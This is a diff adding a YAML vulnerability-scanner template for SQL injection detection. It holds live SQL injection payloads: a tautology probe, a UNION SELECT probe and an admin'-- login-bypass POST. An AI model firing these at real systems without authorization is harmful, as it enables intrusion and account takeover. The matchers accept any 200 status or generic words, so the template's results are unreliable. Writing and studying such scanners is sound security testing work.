@@ -1,0 +1,67 @@
+id: http-sqli-detection
+info:
+  name: "SQL Injection Detection"
+  severity: "Critical"
+  description: "Detects SQL injection vulnerabilities by injecting common SQLi payloads into query parameters and POST data."
+  compliance:
+    owasp: "A03:2021"
+    cwe: "CWE-89"
+requests:
+  - method: GET
+    path: "/product?id=1' OR '1'='1"
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Warning.*mysql_"
+          - "PostgreSQL.*ERROR"
+          - "Driver.*SQL Server"
+          - "ORA-[0-9]{5}"
+          - "Unclosed quotation mark"
+          - "Microsoft OLE DB.*SQL Server"
+      - type: status
+        part: status
+        status:
+          - 200
+          - 500
+    matcher_condition: or
+
+  - method: GET
+    path: "/product?id=1 UNION SELECT NULL--"
+    headers:
+      Accept: "text/html"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SQL"
+          - "syntax"
+          - "mysql"
+          - "error"
+      - type: status
+        part: status
+        status:
+          - 200
+    matcher_condition: or
+
+  - method: POST
+    path: "/login"
+    body: "username=admin'--&password=test"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Welcome"
+          - "Dashboard"
+          - "admin"
+          - "logout"
+      - type: status
+        part: status
+        status:
+          - 302
+          - 200
+    matcher_condition: or
+    follow_redirects: true
